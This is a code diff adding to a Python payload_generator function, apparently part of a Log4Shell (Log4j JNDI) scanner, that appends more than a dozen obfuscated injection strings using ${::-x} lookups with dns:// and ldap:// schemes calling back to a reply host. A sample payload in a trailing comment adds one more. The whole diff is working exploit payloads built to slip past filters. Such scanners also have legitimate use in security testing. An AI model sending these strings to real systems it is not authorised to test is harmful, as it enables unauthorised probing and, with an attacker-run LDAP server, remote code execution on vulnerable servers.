@@ -147,6 +147,24 @@ def payload_generator(identifier, url_input, reply_host):
     payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}i://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
     payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}${{::-i}}://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
 
+    payloads.append(f'${{${{::-j}}ndi:dns://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}di:dns://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}i:dns://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:dns://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-d}}ns://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-d}}${{::-n}}s://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-d}}${{::-n}}${{::-s}}://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+
+
+    payloads.append(f'${{${{::-j}}ndi:ldap://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}di:ldap://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}i:ldap://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}dap://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}ap://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}p://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+
     return payloads
 
 #${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
